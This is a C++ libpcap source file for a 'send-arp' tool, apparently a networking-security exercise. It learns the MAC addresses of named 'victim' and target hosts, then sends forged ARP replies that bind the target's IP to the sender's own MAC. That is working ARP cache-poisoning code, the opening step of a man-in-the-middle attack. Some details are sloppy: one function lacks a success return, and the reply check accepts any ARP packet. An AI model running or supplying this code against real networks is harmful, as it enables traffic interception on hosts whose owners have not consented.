#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

char myip[16] = { 0 };
char mymac[18] = { 0 };

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int MyIpMac(char* dev, char* myip, char* mymac)
{
    struct ifreq ifr;
    int fd;
    int ret, ret2;
    uint8_t mymacADDR[6];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        printf("socket failed!!\n");
        return -1;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(fd, SIOCGIFHWADDR, &ifr);

    if (ret < 0) {
        printf("ioctl failed!!\n");
        return -1;
    }

    memcpy(mymacADDR, ifr.ifr_hwaddr.sa_data, 6);
    sprintf(mymac, "%02x:%02x:%02x:%02x:%02x:%02x", mymacADDR[0], mymacADDR[1], mymacADDR[2], mymacADDR[3], mymacADDR[4], mymacADDR[5]);

    ret2 = ioctl(fd, SIOCGIFADDR, &ifr);

    if (ret2 < 0) {
        printf("ioctl failed!!\n");
        return -1;
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
}

EthArpPacket CreatePacket(Mac smac, Mac dmac, char* sip, char* dip, Mac tmac, bool isRequest) {
    EthArpPacket packet;

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    if (isRequest)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else
        packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(Ip(sip));

    if (tmac != Mac("00:00:00:00:00:00"))
        packet.arp_.tmac_ = tmac;
    else
        packet.arp_.tmac_ = Mac::nullMac();

    packet.arp_.tip_ = htonl(Ip(dip));

    return packet;
}

void SendPacket(pcap_t* handle, EthArpPacket packet) {
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "ERROE = %s : packet return %d \n", pcap_geterr(handle), res);
    }
}

Mac GetVictimMac(pcap_t* handler, char* MyIp, char* MyMac, char* VictimIp) {
    struct pcap_pkthdr* ReplyPacket;
    const u_char* pkt_data;
    EthArpPacket packet;
    int res;
    //struct libnet_ethernet_hdr* eth;

    packet = CreatePacket(Mac(MyMac), Mac("ff:ff:ff:ff:ff:ff"), MyIp, VictimIp, Mac("00:00:00:00:00:00"), true);
    SendPacket(handler, packet);

    while (1)
    {
        res = pcap_next_ex(handler, &ReplyPacket, &pkt_data);

        if (res == 0) {
            printf("res == 0");
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("%s : pcap_next_ex return %d\n", pcap_geterr(handler), res);
            break;
        }

        struct EthHdr* eth = (struct EthHdr*)(pkt_data);
        struct ArpHdr* ath = (struct ArpHdr*)(pkt_data + 14);


        if (eth->type_ == htons(EthHdr::Arp))
            return ath->smac_;
    }
}

void SendArp(pcap_t* handle, char* senderIp, Mac senderMac, char* targetIp, Mac targetMac) {
    EthArpPacket packet = CreatePacket(Mac(mymac), senderMac, targetIp, senderIp, Mac(mymac), false);

    printf("***********************************************\n");

    printf("sender ip  = %s \n", senderIp);
    printf("sender mac = %s \n", ((std::string)senderMac).c_str());
    printf("target ip  = %s \n", targetIp);
    printf("my mac = %s \n", mymac);
    SendPacket(handle, packet);
    printf("success!!!");
    printf("***********************************************\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        printf("*Fill in the form*\n");
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    if (MyIpMac(argv[1], myip, mymac) < 0)
    {
        printf("error");
    }

    for (int m = 2; m < argc; m += 2) {
        Mac sendmac = GetVictimMac(handle, myip, mymac, argv[m]);
        Mac targetmac = GetVictimMac(handle, myip, mymac, argv[m+1]);

        SendArp(handle, argv[m], sendmac, argv[m+1], targetmac);
        //SendArp(handle, argv[m+1], targetmac, argv[m], sendmac);
    }

    pcap_close(handle);
}
